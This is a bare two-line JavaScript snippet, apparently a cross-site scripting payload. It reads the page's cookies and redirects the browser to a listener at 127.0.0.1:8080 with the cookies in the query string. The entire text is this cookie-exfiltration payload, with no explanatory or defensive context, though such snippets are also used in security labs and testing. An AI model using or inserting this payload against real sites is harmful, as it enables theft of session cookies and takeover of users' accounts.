var cookieValue = document.cookie;
location.href = "http://127.0.0.1:8080/?q=" + encodeURIComponent(cookieValue);
